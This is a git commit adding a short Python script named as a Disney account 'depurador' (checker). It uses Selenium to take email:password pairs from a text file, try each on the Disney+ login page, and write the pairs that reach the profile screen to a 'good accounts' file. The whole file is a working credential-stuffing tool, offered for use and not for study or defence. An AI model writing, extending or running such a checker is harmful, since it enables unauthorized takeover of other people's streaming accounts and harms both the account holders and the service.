691ebc42c84eb7b494385cfb4b36fd96ff8c45ff
Gabriel <gbordesc@uft.edu>
2021-03-21 14:30:42 -0300

    Inicio

---
+++ main.py
@@ -0,0 +1,54 @@
+#DEPURADOR DE CUENTAS DISNEY
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+import time
+import numpy as np
+#Realizamos la importacion
+import pandas as pd
+
+#Leeemos el archivo de datos
+df = pd.read_csv('disney.txt',sep=':')
+# print(df.values[0])
+
+
+
+inicio=0
+
+final=len(df.values)
+
+cuentas_buenas=[]
+while inicio<final:
+    driver = webdriver.Chrome()
+    user=df.values[inicio][0]
+    password=df.values[inicio][1]
+    driver.get("https://www.disneyplus.com/es-419/login")
+    time.sleep(5)
+    input_user = driver.find_element(By.XPATH, "//input[@id='email']")
+    input_user.send_keys(user)
+    time.sleep(2)
+    driver.find_element_by_xpath("//button[contains(text(),'CONTINUAR')]").click()
+    time.sleep(2)
+    pass_user = driver.find_element(By.XPATH, "//input[@id='password']")
+    pass_user.send_keys(password)
+    time.sleep(2)
+    driver.find_element_by_xpath("//button[contains(text(),'INICIAR SESIÓN')]").click()
+    time.sleep(5)
+    if str(driver.current_url)=="https://www.disneyplus.com/es-419/select-profile":
+        cuentas_buenas.append([user, password])
+    else:
+        pass
+
+    driver.close()
+    inicio=inicio+1
+
+
+
+
+
+dp = pd.DataFrame(cuentas_buenas, columns = ['Cuenta', 'Contraseña'])
+np.savetxt('cuentas_buenas.txt', dp.values, fmt='%s', delimiter=":", header="Cuenta \t Contrasena \t")
+# print(cuentas_buenas)
+
+
+
+#https://www.disneyplus.com/es-419/restart-subscription
